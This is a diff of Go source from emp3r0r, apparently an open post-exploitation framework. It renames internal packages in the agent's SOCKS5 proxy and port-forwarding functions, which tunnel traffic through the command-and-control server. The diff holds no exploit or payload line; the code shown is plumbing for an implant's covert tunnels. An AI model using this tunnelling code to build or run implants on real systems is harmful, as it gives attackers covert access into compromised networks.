@@ -11,8 +11,8 @@ import (
 	"sync"
 	"time"
 
-	"github.com/jm33-m0/emp3r0r/core/internal/emp3r0r_def"
-	"github.com/jm33-m0/emp3r0r/core/internal/tun"
+	"github.com/jm33-m0/emp3r0r/core/internal/def"
+	"github.com/jm33-m0/emp3r0r/core/internal/transport"
 	"github.com/posener/h2conn"
 )
 
@@ -40,21 +40,21 @@ func Socks5Proxy(op string, addr string) (err error) {
 	case "on":
 		log.Printf("Starting Socks5Proxy %s", addr)
 		go func() {
-			err = tun.StartSocks5Proxy(addr, RuntimeConfig.DoHServer, emp3r0r_def.ProxyServer)
+			err = transport.StartSocks5Proxy(addr, RuntimeConfig.DoHServer, def.ProxyServer)
 			if err != nil {
 				log.Printf("StartSock5Proxy %s: %v", addr, err)
 			}
 		}()
 	case "off":
 		log.Printf("Stopping Socks5Proxy %s", addr)
-		if emp3r0r_def.ProxyServer == nil {
+		if def.ProxyServer == nil {
 			return errors.New("proxy server is not running")
 		}
-		err = emp3r0r_def.ProxyServer.Shutdown()
+		err = def.ProxyServer.Shutdown()
 		if err != nil {
 			log.Print(err)
 		}
-		emp3r0r_def.ProxyServer = nil
+		def.ProxyServer = nil
 	default:
 		return errors.New("operation not supported")
 	}
@@ -69,8 +69,8 @@ func PortFwd(addr, sessionID, protocol string, reverse bool, timeout int) (err e
 		session PortFwdSession
 
 		url = fmt.Sprintf("%s%s/%s",
-			emp3r0r_def.CCAddress,
-			tun.ProxyAPI,
+			def.CCAddress,
+			transport.ProxyAPI,
 			sessionID)
 
 		// connection
@@ -78,7 +78,7 @@ func PortFwd(addr, sessionID, protocol string, reverse bool, timeout int) (err e
 		ctx    context.Context
 		cancel context.CancelFunc
 	)
-	if !tun.ValidateIPPort(addr) && !reverse {
+	if !transport.ValidateIPPort(addr) && !reverse {
 		return fmt.Errorf("invalid address: %s", addr)
 	}
 
@@ -93,7 +93,7 @@ func PortFwd(addr, sessionID, protocol string, reverse bool, timeout int) (err e
 			return fmt.Errorf("failed to connect to CC: %v", err)
 		}
 		log.Printf("PortFwd (%s) started: %s (%s)", protocol, addr, sessionID)
-		go tun.FwdToDport(ctx, cancel, addr, sessionID, protocol, conn, timeout)
+		go transport.FwdToDport(ctx, cancel, addr, sessionID, protocol, conn, timeout)
 	}
 
 	// remember to cleanup
@@ -138,8 +138,8 @@ func listenAndFwd(ctx context.Context, cancel context.CancelFunc,
 		lport := strings.Split(conn.RemoteAddr().String(), ":")[1]
 		shID := fmt.Sprintf("%s_%s-reverse", sessionID, lport)
 		url := fmt.Sprintf("%s%s/%s",
-			emp3r0r_def.CCAddress,
-			tun.ProxyAPI,
+			def.CCAddress,
+			transport.ProxyAPI,
 			shID)
 
 		// start a h2 connection per incoming TCP connection
